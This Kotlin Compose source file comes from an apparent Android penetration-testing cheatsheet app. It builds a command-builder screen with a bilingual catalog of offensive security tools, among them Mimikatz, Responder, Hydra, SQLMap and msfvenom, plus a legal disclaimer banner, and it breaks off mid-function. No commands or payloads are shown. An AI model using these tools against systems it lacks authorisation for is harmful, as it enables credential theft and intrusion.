package com.hackingcheatsheets.app.ui.components

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.TrendingUp
import androidx.compose.material.icons.filled.BugReport
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Clear
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.DataObject
import androidx.compose.material.icons.filled.Fingerprint
import androidx.compose.material.icons.filled.Hub
import androidx.compose.material.icons.filled.Key
import androidx.compose.material.icons.filled.KeyboardArrowDown
import androidx.compose.material.icons.filled.KeyboardArrowUp
import androidx.compose.material.icons.filled.Lan
import androidx.compose.material.icons.filled.Public
import androidx.compose.material.icons.filled.Radar
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Share
import androidx.compose.material.icons.filled.SwapHoriz
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.data.Cheatsheet
import com.hackingcheatsheets.app.ui.theme.AccentBlue
import com.hackingcheatsheets.app.ui.theme.AccentEmerald
import com.hackingcheatsheets.app.ui.theme.AccentIndigo
import com.hackingcheatsheets.app.ui.theme.AccentPink
import com.hackingcheatsheets.app.ui.theme.AccentPurple
import com.hackingcheatsheets.app.ui.theme.AccentRose
import com.hackingcheatsheets.app.ui.theme.AccentTeal
import com.hackingcheatsheets.app.ui.theme.AccentYellow
import com.hackingcheatsheets.app.ui.theme.BackgroundDark
import com.hackingcheatsheets.app.ui.theme.BorderDark
import com.hackingcheatsheets.app.ui.theme.BorderLight
import com.hackingcheatsheets.app.ui.theme.CodeBlockBg
import com.hackingcheatsheets.app.ui.theme.CyberGreen
import com.hackingcheatsheets.app.ui.theme.ExploitRed
import com.hackingcheatsheets.app.ui.theme.SurfaceDark
import com.hackingcheatsheets.app.ui.theme.SurfaceVariantDark
import com.hackingcheatsheets.app.ui.theme.TerminalCyan
import com.hackingcheatsheets.app.ui.theme.TextMuted
import com.hackingcheatsheets.app.ui.theme.TextPrimary
import com.hackingcheatsheets.app.ui.theme.TextSecondary
import com.hackingcheatsheets.app.ui.theme.WarningOrange

// Tool category definition for command builder
enum class BuilderCategory(val titleTr: String, val titleEn: String, val icon: ImageVector, val color: Color) {
    ALL("Tümü", "All", Icons.Default.Terminal, CyberGreen),
    RECON("Ağ & Tarama", "Network & Scan", Icons.Default.Radar, TerminalCyan),
    WEB("Web & Fuzzing", "Web & Fuzzing", Icons.Default.Public, CyberGreen),
    AD("Active Directory", "Active Directory", Icons.Default.Lan, AccentPurple),
    PASSWORDS("Parola Kırma", "Password Cracking", Icons.Default.Key, AccentYellow),
    SNIFFING("Paket & Sniff", "Sniffing & Pcap", Icons.Default.Hub, AccentBlue),
    TUNNELING("Pivoting & Tünel", "Pivoting & Tunnel", Icons.Default.SwapHoriz, AccentIndigo),
    PRIVESC("Yetki Yükseltme", "PrivEsc", Icons.AutoMirrored.Filled.TrendingUp, WarningOrange),
    OSINT("Açık İstihbarat", "OSINT", Icons.Default.Visibility, AccentTeal),
    REVERSE("Tersine Mühendislik", "Reverse Eng", Icons.Default.BugReport, AccentPink),
    FORENSICS("Adli Bilişim", "Forensics", Icons.Default.Fingerprint, AccentRose),
    EXPLOITATION("İstismar & Shell", "Exploitation", Icons.Default.Terminal, ExploitRed)
}

// Tool definition for builder selection
data class BuilderToolItem(
    val id: String,
    val name: String,
    val category: BuilderCategory,
    val descriptionTr: String,
    val descriptionEn: String
)

val ALL_BUILDER_TOOLS = listOf(
    // 1. RECON & SCANNING
    BuilderToolItem("nmap", "Nmap", BuilderCategory.RECON, "Port ve zafiyet tarama motoru", "Network port & vulnerability scanner"),
    BuilderToolItem("rustscan", "RustScan", BuilderCategory.RECON, "Aşırı hızlı modern port tarayıcı", "Fastest port scanner piped into Nmap"),
    BuilderToolItem("masscan", "Masscan", BuilderCategory.RECON, "İnternet ölçeğinde asenkron tarama", "Asynchronous internet-scale scanner"),
    BuilderToolItem("naabu", "Naabu", BuilderCategory.RECON, "Hızlı ve güvenilir SYN/CONNECT tarayıcı", "Fast SYN/CONNECT port discovery"),
    BuilderToolItem("dnsx", "dnsx", BuilderCategory.RECON, "Çok iş parçacıklı DNS sorgulama", "High-throughput DNS resolution"),
    BuilderToolItem("subfinder", "Subfinder", BuilderCategory.RECON, "Pasif alt alan adı (subdomain) keşfi", "Passive subdomain discovery tool"),
    BuilderToolItem("amass", "Amass", BuilderCategory.RECON, "Derinlemesine DNS ve saldırı yüzeyi haritalama", "In-depth DNS enumeration & network mapping"),
    
    // 2. WEB CONTENT & FUZZING
    BuilderToolItem("ffuf", "ffuf", BuilderCategory.WEB, "Hızlı web dizin ve parametre fuzzerı", "Fast web fuzzer for paths and parameters"),
    BuilderToolItem("gobuster", "Gobuster", BuilderCategory.WEB, "Dizin, DNS ve vhost kaba kuvveti", "Directory, DNS, and vhost brute-forcer"),
    BuilderToolItem("feroxbuster", "Feroxbuster", BuilderCategory.WEB, "Özyinelemeli hızlı içerik keşfi", "Fast, recursive content discovery"),
    BuilderToolItem("dirsearch", "dirsearch", BuilderCategory.WEB, "Gelişmiş web yolu tarayıcısı", "Advanced web path scanner"),
    BuilderToolItem("httpx", "httpx", BuilderCategory.WEB, "Hızlı ve zengin HTTP servis yoklayıcı", "Fast and multi-purpose HTTP probe toolkit"),
    BuilderToolItem("nuclei", "Nuclei", BuilderCategory.WEB, "Şablon tabanlı otomatik zafiyet tarayıcı", "Fast template-based vulnerability scanner"),
    BuilderToolItem("nikto", "Nikto", BuilderCategory.WEB, "Web sunucu zafiyet tarayıcısı", "Web server vulnerability scanner"),
    BuilderToolItem("whatweb", "WhatWeb", BuilderCategory.WEB, "Web teknoloji ve sürüm tespiti", "Web technology fingerprinting"),
    BuilderToolItem("wfuzz", "Wfuzz", BuilderCategory.WEB, "Esnek web uygulama fuzzerı", "Flexible web app fuzzer"),
    BuilderToolItem("arjun", "Arjun", BuilderCategory.WEB, "Gizli HTTP parametre keşif motoru", "HTTP parameter discovery suite"),
    BuilderToolItem("dalfox", "Dalfox", BuilderCategory.WEB, "Gelişmiş XSS tarayıcısı ve parametre analizi", "Powerful XSS scanner and analyzer"),
    BuilderToolItem("sqlmap", "SQLMap", BuilderCategory.WEB, "Otomatik SQL enjeksiyonu ve sömürü", "Automated SQL injection and DB takeover"),
    BuilderToolItem("wpscan", "WPScan", BuilderCategory.WEB, "WordPress güvenlik denetleyicisi", "WordPress vulnerability scanner"),
    BuilderToolItem("commix", "Commix", BuilderCategory.WEB, "Otomatik komut enjeksiyon aracı", "Automated command injection tester"),
    BuilderToolItem("wafw00f", "wafw00f", BuilderCategory.WEB, "WAF (Web Güvenlik Duvarı) tespiti", "Web Application Firewall fingerprinting"),

    // 3. ACTIVE DIRECTORY & NETWORK
    BuilderToolItem("netexec", "NetExec (nxc)", BuilderCategory.AD, "Active Directory ve ağ protokol sömürüsü", "AD & multi-protocol exploitation"),
    BuilderToolItem("coercer", "Coercer", BuilderCategory.AD, "Windows kimlik doğrulama zorlama (coerce auth)", "Coerce Windows authentication automatically"),
    BuilderToolItem("rubeus", "Rubeus", BuilderCategory.AD, "Kerberos kötüye kullanım ve bilet alma", "Kerberos interaction and abuse toolkit"),
    BuilderToolItem("enum4linux-ng", "enum4linux-ng", BuilderCategory.AD, "Yeni nesil Windows/Samba numaralandırma", "Next-gen Samba and Windows enum"),
    BuilderToolItem("bloodhound", "BloodHound", BuilderCategory.AD, "Active Directory ilişki grafiği", "AD domain relationship graph collector"),
    BuilderToolItem("certipy", "Certipy", BuilderCategory.AD, "AD CS sertifika şablon zafiyetleri", "Active Directory Certificate Services"),
    BuilderToolItem("kerbrute", "Kerbrute", BuilderCategory.AD, "Kerberos kullanıcı ve parola püskürtme", "Kerberos pre-auth enum & spraying"),
    BuilderToolItem("evil-winrm", "Evil-WinRM", BuilderCategory.AD, "Windows uzaktan yönetim kabuğu", "Ultimate WinRM shell for hacking"),
    BuilderToolItem("responder", "Responder", BuilderCategory.AD, "LLMNR, NBT-NS ve MDNS zehirleyici", "LLMNR/NBT-NS poisoner and rogue auth"),

    // 4. PASSWORDS & CRACKING
    BuilderToolItem("hashcat", "Hashcat", BuilderCategory.PASSWORDS, "Dünyanın en hızlı GPU parola kırıcısı", "World's fastest GPU password cracker"),
    BuilderToolItem("john", "John The Ripper", BuilderCategory.PASSWORDS, "Gelişmiş çevrimdışı hash kırıcı", "Feature-rich offline password cracker"),
    BuilderToolItem("hydra", "Hydra", BuilderCategory.PASSWORDS, "Hızlı paralel ağ giriş kırıcısı", "Fast online network login brute-forcer"),
    BuilderToolItem("aircrack-ng", "Aircrack-ng", BuilderCategory.PASSWORDS, "802.11 WPA/WPA2 WEP anahtar kırıcı", "WiFi 802.11 WPA/WPA2 key cracker"),
    BuilderToolItem("cewl", "CeWL", BuilderCategory.PASSWORDS, "Özel kelime listesi üreteci", "Custom wordlist generator from web"),
    BuilderToolItem("name-that-hash", "name-that-hash", BuilderCategory.PASSWORDS, "Modern hash türü tespit aracı", "Modern hash identification engine"),

    // 5. PACKET & SNIFFING
    BuilderToolItem("tcpdump", "tcpdump", BuilderCategory.SNIFFING, "Ağ trafiği yakalama ve paket filtresi", "Network packet analyzer & capture"),
    BuilderToolItem("tshark", "tshark", BuilderCategory.SNIFFING, "Terminal tabanlı Wireshark ayrıştırıcı", "Terminal-based Wireshark dissector"),

    // 6. PIVOTING & TUNNELING
    BuilderToolItem("chisel", "Chisel", BuilderCategory.TUNNELING, "HTTP üzerinden hızlı TCP/UDP tüneli", "Fast TCP/UDP tunnel over HTTP"),
    BuilderToolItem("ligolo-ng", "Ligolo-ng", BuilderCategory.TUNNELING, "TUN arayüzü ile modern pivotlama", "Modern pivoting using TUN interfaces"),
    BuilderToolItem("netcat", "Netcat (nc)", BuilderCategory.TUNNELING, "İsviçre çakısı ağ bağlantı ve port dinleyici", "Networking utility for read/write over connections"),
    BuilderToolItem("proxychains", "Proxychains", BuilderCategory.TUNNELING, "TCP bağlantılarını proxy zincirine aktarma", "Redirect TCP connections through proxies"),
    BuilderToolItem("sshuttle", "sshuttle", BuilderCategory.TUNNELING, "SSH üzerinden şeffaf VPN tüneli", "Transparent proxy VPN over SSH"),

    // 7. PRIVESC
    BuilderToolItem("peass-ng", "PEASS-ng", BuilderCategory.PRIVESC, "Linux ve Windows yetki yükseltme taraması", "Privilege escalation scanner suite"),
    BuilderToolItem("mimikatz", "Mimikatz", BuilderCategory.PRIVESC, "Windows bellekten kimlik bilgisi çekme", "Extract plaintexts, hashes from memory"),
    BuilderToolItem("pypykatz", "pypykatz", BuilderCategory.PRIVESC, "LSASS dökümü ve hash ayrıştırıcı", "Pure Python Mimikatz implementation"),

    // 8. OSINT
    BuilderToolItem("theharvester", "theHarvester", BuilderCategory.OSINT, "E-posta, alan adı ve kişi istihbaratı", "E-mails, subdomains, and names OSINT"),
    BuilderToolItem("sherlock", "Sherlock", BuilderCategory.OSINT, "Sosyal medya kullanıcı adı avcısı", "Hunt social media accounts by username"),
    BuilderToolItem("gitleaks", "Gitleaks", BuilderCategory.OSINT, "Git depolarında ifşa olan anahtar taraması", "Scan git repos for leaked secrets"),
    BuilderToolItem("trufflehog", "TruffleHog", BuilderCategory.OSINT, "Git depolarında gizli anahtar taraması", "Find leaked secrets and API keys"),

    // 9. REVERSE ENGINEERING & EXPLOIT
    BuilderToolItem("searchsploit", "Searchsploit", BuilderCategory.REVERSE, "Çevrimdışı Exploit-DB arama aracı", "Offline Exploit-DB search utility"),
    BuilderToolItem("checksec", "checksec", BuilderCategory.REVERSE, "İkili dosya güvenlik koruma denetimi", "Check binary mitigations (ASLR, NX)"),
    BuilderToolItem("radare2", "Radare2 (rabin2)", BuilderCategory.REVERSE, "İkili dosya sembol ve string analizi", "Binary info, symbols, and strings extraction"),
    BuilderToolItem("binwalk", "Binwalk", BuilderCategory.FORENSICS, "Firmware ve gömülü dosya analizörü", "Firmware analysis and extraction tool"),
    BuilderToolItem("exiftool", "ExifTool", BuilderCategory.FORENSICS, "Dosya üst veri (metadata) okuyucu", "Read and write meta information in files"),
    BuilderToolItem("volatility", "Volatility", BuilderCategory.FORENSICS, "Bellek adli bilişim analiz çerçevesi", "Advanced memory forensics framework"),
    BuilderToolItem("msfvenom", "Msfvenom", BuilderCategory.EXPLOITATION, "Metasploit payload ve kabuk kod derleyici", "Metasploit standalone payload generator")
)

@Composable
fun CommandBuilderView(
    language: AppLanguage,
    allCheatsheets: List<Cheatsheet> = emptyList(),
    initialToolId: String = "nmap",
    modifier: Modifier = Modifier
) {
    var selectedToolId by remember { mutableStateOf(initialToolId) }
    var selectedCategory by remember { mutableStateOf(BuilderCategory.ALL) }
    var searchQuery by remember { mutableStateOf("") }
    var isToolSelectorOpen by remember { mutableStateOf(false) }

    val currentTool = ALL_BUILDER_TOOLS.firstOrNull { it.id == selectedToolId } ?: ALL_BUILDER_TOOLS[0]

    // Filter tools by category and search
    val filteredTools = ALL_BUILDER_TOOLS.filter { tool ->
        val matchesCategory = selectedCategory == BuilderCategory.ALL || tool.category == selectedCategory
        val matchesSearch = searchQuery.isBlank() ||
                tool.name.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.id.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.descriptionTr.lowercase().contains(searchQuery.lowercase().trim()) ||
                tool.descriptionEn.lowercase().contains(searchQuery.lowercase().trim())
        matchesCategory && matchesSearch
    }

    Column(modifier = modifier.fillMaxWidth()) {
        // Legal Disclaimer Banner
        LegalDisclaimerBanner(language = language)

        Spacer(modifier = Modifier.height(10.dp))

        // Tool Selector Header Card
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .clickable { isToolSelectorOpen = !isToolSelectorOpen },
            colors = CardDefaults.cardColors(containerColor = SurfaceDark),
            shape = RoundedCornerShape(12.dp),
            border = CardDefaults.outlinedCardBorder().copy(
                brush = SolidColor(if (isToolSelectorOpen) CyberGreen else BorderDark)
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(
                        modifier = Modifier
                            .size(38.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(currentTool.category.color.copy(alpha = 0.15f))
                            .border(1.dp, currentTool.category.color.copy(alpha = 0.35f), RoundedCornerShape(8.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = currentTool.category.icon,
                            contentDescription = currentTool.name,
                            tint = currentTool.category.color,
                            modifier = Modifier.size(20.dp)
                        )
                    }

                    Spacer(modifier = Modifier.width(10.dp))

                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = currentTool.name,
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = currentTool.category.titleTr.uppercase(),
                                fontSize = 9.sp,
                                fontFamily = FontFamily.Monospace,
                                color = currentTool.category.color
                            )
                        }
                        Text(
                            text = if (language == AppLanguage.TR) currentTool.descriptionTr else currentTool.descriptionEn,
                            style = MaterialTheme.typography.bodySmall,
                            color = TextSecondary,
                            maxLines = 1
                        )
                    }
                }

                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(6.dp))
                            .background(SurfaceVariantDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                            .padding(horizontal = 8.dp, vertical = 4.dp)
                    ) {
                        Text(
                            text = if (language == AppLanguage.TR) "Araç Seç" else "Select Tool",
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            color = CyberGreen
                        )
                    }
                    Spacer(modifier = Modifier.width(4.dp))
                    Icon(
                        imageVector = if (isToolSelectorOpen) Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                        contentDescription = "Toggle Picker",
                        tint = TextMuted,
                        modifier = Modifier.size(20.dp)
                    )
                }
            }
        }

        // Expandable Tool Picker Drawer / Grid
        AnimatedVisibility(visible = isToolSelectorOpen) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(top = 10.dp)
                    .background(SurfaceDark, RoundedCornerShape(12.dp))
                    .border(1.dp, BorderDark, RoundedCornerShape(12.dp))
                    .padding(12.dp)
            ) {
                // Search Input inside picker
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(SurfaceVariantDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                        .padding(horizontal = 10.dp, vertical = 7.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(imageVector = Icons.Default.Search, contentDescription = "Search", tint = CyberGreen, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        BasicTextField(
                            value = searchQuery,
                            onValueChange = { searchQuery = it },
                            modifier = Modifier.weight(1f),
                            textStyle = MaterialTheme.typography.bodyMedium.copy(color = TextPrimary),
                            cursorBrush = SolidColor(CyberGreen),
                            singleLine = true,
                            decorationBox = { innerTextField ->
                                if (searchQuery.isEmpty()) {
                                    Text(
                                        text = if (language == AppLanguage.TR) "Araç ara (örn: masscan, nikto, wpscan, mimikatz)..." else "Search tools...",
                                        color = TextMuted,
                                        fontSize = 12.sp
                                    )
                                }
                                innerTextField()
                            }
                        )
                        if (searchQuery.isNotEmpty()) {
                            IconButton(onClick = { searchQuery = "" }, modifier = Modifier.size(18.dp)) {
                                Icon(imageVector = Icons.Default.Clear, contentDescription = "Clear", tint = TextMuted, modifier = Modifier.size(14.dp))
                            }
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Category Chips Carousel
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .horizontalScroll(rememberScrollState()),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    BuilderCategory.values().forEach { cat ->
                        val isCatSelected = selectedCategory == cat
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .background(if (isCatSelected) cat.color.copy(alpha = 0.2f) else SurfaceVariantDark)
                                .border(1.dp, if (isCatSelected) cat.color else BorderDark, RoundedCornerShape(6.dp))
                                .clickable { selectedCategory = cat }
                                .padding(horizontal = 8.dp, vertical = 5.dp)
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = cat.icon,
                                    contentDescription = cat.titleTr,
                                    tint = if (isCatSelected) cat.color else TextMuted,
                                    modifier = Modifier.size(12.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = if (language == AppLanguage.TR) cat.titleTr else cat.titleEn,
                                    fontSize = 10.5.sp,
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = if (isCatSelected) FontWeight.Bold else FontWeight.Normal,
                                    color = if (isCatSelected) cat.color else TextSecondary
                                )
                            }
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Tools Grid List
                Text(
                    text = "${filteredTools.size} ${if (language == AppLanguage.TR) "araç bulundu" else "tools found"}",
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    color = TextMuted
                )
                Spacer(modifier = Modifier.height(6.dp))

                Column(
                    modifier = Modifier.fillMaxWidth(),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    filteredTools.forEach { toolItem ->
                        val isCurrent = toolItem.id == selectedToolId
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(8.dp))
                                .background(if (isCurrent) toolItem.category.color.copy(alpha = 0.15f) else SurfaceVariantDark)
                                .border(1.dp, if (isCurrent) toolItem.category.color else BorderDark, RoundedCornerShape(8.dp))
                                .clickable {
                                    selectedToolId = toolItem.id
                                    isToolSelectorOpen = false
                                }
                                .padding(horizontal = 10.dp, vertical = 7.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = toolItem.category.icon,
                                    contentDescription = toolItem.name,
                                    tint = toolItem.category.color,
                                    modifier = Modifier.size(16.dp)
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(
                                    text = toolItem.name,
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = TextPrimary
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(
                                    text = "• ${if (language == AppLanguage.TR) toolItem.descriptionTr else toolItem.descriptionEn}",
                                    fontSize = 10.5.sp,
                                    color = TextSecondary,
                                    maxLines = 1
                                )
                            }
                            if (isCurrent) {
                                Icon(imageVector = Icons.Default.Check, contentDescription = "Selected", tint = toolItem.category.color, modifier = Modifier.size(16.dp))
                            }
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // RENDER ACTIVE TOOL BUILDER
        when (selectedToolId) {
            "nmap" -> NmapBuilder(language)
            "rustscan" -> RustScanBuilder(language)
            "masscan" -> MasscanBuilder(language)
            "naabu" -> NaabuBuilder(language)
            "dnsx" -> DnsxBuilder(language)
            "subfinder" -> SubfinderBuilder(language)
            "amass" -> AmassBuilder(language)
            "ffuf" -> FfufBuilder(language)
            "gobuster" -> GobusterBuilder(language)
            "feroxbuster" -> FeroxbusterBuilder(language)
            "dirsearch" -> DirsearchBuilder(language)
            "httpx" -> HttpxBuilder(language)
            "nuclei" -> NucleiBuilder(language)
            "nikto" -> NiktoBuilder(language)
            "whatweb" -> WhatWebBuilder(language)
            "wfuzz" -> WfuzzBuilder(language)
            "arjun" -> ArjunBuilder(language)
            "dalfox" -> DalfoxBuilder(language)
            "sqlmap" -> SqlmapBuilder(language)
            "wpscan" -> WPScanBuilder(language)
            "commix" -> CommixBuilder(language)
            "wafw00f" -> Wafw00fBuilder(language)
            "netexec" -> NetExecBuilder(language)
            "coercer" -> CoercerBuilder(language)
            "rubeus" -> RubeusBuilder(language)
            "enum4linux-ng" -> Enum4linuxNgBuilder(language)
            "bloodhound" -> BloodHoundBuilder(language)
            "certipy" -> CertipyBuilder(language)
            "kerbrute" -> KerbruteBuilder(language)
            "evil-winrm" -> EvilWinrmBuilder(language)
            "responder" -> ResponderBuilder(language)
            "hashcat" -> HashcatBuilder(language)
            "john" -> JohnBuilder(language)
            "hydra" -> HydraBuilder(language)
            "aircrack-ng" -> AircrackNgBuilder(language)
            "cewl" -> CewlBuilder(language)
            "name-that-hash" -> NameThatHashBuilder(language)
            "tcpdump" -> TcpdumpBuilder(language)
            "tshark" -> TsharkBuilder(language)
            "chisel" -> ChiselBuilder(language)
            "ligolo-ng" -> LigoloBuilder(language)
            "netcat" -> NetcatBuilder(language)
            "proxychains" -> ProxychainsBuilder(language)
            "sshuttle" -> SshuttleBuilder(language)
            "peass-ng" -> PeassNgBuilder(language)
            "mimikatz" -> MimikatzBuilder(language)
            "pypykatz" -> PypykatzBuilder(language)
            "theharvester" -> TheHarvesterBuilder(language)
            "sherlock" -> SherlockBuilder(language)
            "gitleaks" -> GitleaksBuilder(language)
            "trufflehog" -> TruffleHogBuilder(language)
            "searchsploit" -> SearchsploitBuilder(language)
            "checksec" -> ChecksecBuilder(language)
            "radare2" -> Rabin2Builder(language)
            "binwalk" -> BinwalkBuilder(language)
            "exiftool" -> ExifToolBuilder(language)
            "volatility" -> VolatilityBuilder(language)
            "msfvenom" -> MsfvenomBuilder(language)
            else -> {
                // Fallback to Nmap
                NmapBuilder(language)
            }
        }
    }
}

// -------------------------------------------------------------
// LEGAL DISCLAIMER BANNER
// -------------------------------------------------------------
@Composable
fun LegalDisclaimerBanner(language: AppLanguage) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = SurfaceDark),
        shape = RoundedCornerShape(10.dp),
        border = CardDefaults.outlinedCardBorder().copy(
            brush = SolidColor(WarningOrange.copy(alpha = 0.4f))
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(10.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier
                    .size(32.dp)
                    .clip(RoundedCornerShape(6.dp))
                    .background(WarningOrange.copy(alpha = 0.15f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = "Legal Notice",
                    tint = WarningOrange,
                    modifier = Modifier.size(18.dp)
                )
            }

            Spacer(modifier = Modifier.width(10.dp))

            Column {
                Text(
                    text = if (language == AppLanguage.TR) "YASAL UYARI / SORUMLULUK REDDİ" else "LEGAL DISCLAIMER / ETHICAL USE",
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = WarningOrange
                )
                Text(
                    text = if (language == AppLanguage.TR)
                        "Bu araçlar ve komut oluşturucular yalnızca yetkili güvenlik testleri, araştırmaları ve eğitim amaçlıdır. İzinsiz taramalar yasalara aykırıdır."
                    else
                        "This tool suite is intended strictly for authorized security assessments, defensive audits, and education. Unauthorized use is prohibited.",
                    fontSize = 10.5.sp,
                    color = TextSecondary,
                    lineHeight = 14.sp
                )
            }
        }
    }
}

// -------------------------------------------------------------
// LIVE COMMAND PREVIEW BOX COMPONENT
// -------------------------------------------------------------
@Composable
fun GeneratedCommandCard(
    command: String,
    language: AppLanguage,
    onReset: (() -> Unit)? = null,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current

    Column(
        modifier = modifier
            .fillMaxWidth()
            .padding(top = 10.dp, bottom = 4.dp)
            .background(CodeBlockBg, RoundedCornerShape(10.dp))
            .border(1.dp, CyberGreen.copy(alpha = 0.5f), RoundedCornerShape(10.dp))
    ) {
        // Window Title Bar
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(SurfaceVariantDark, RoundedCornerShape(topStart = 10.dp, topEnd = 10.dp))
                .padding(horizontal = 12.dp, vertical = 6.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFF5F56)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFFBD2E)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFF27C93F)))
                Spacer(modifier = Modifier.width(10.dp))
                Text(
                    text = if (language == AppLanguage.TR) "CANLI KOMUT" else "LIVE COMMAND",
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = CyberGreen
                )
            }

            Row(verticalAlignment = Alignment.CenterVertically) {
                if (onReset != null) {
                    IconButton(onClick = onReset, modifier = Modifier.size(26.dp)) {
                        Icon(imageVector = Icons.Default.Refresh, contentDescription = "Reset", tint = TextMuted, modifier = Modifier.size(14.dp))
                    }
                    Spacer(modifier = Modifier.width(2.dp))
                }
                IconButton(
                    onClick = {
                        val shareIntent = Intent().apply {
                            action = Intent.ACTION_SEND
                            putExtra(Intent.EXTRA_TEXT, command)
                            type = "text/plain"
                        }
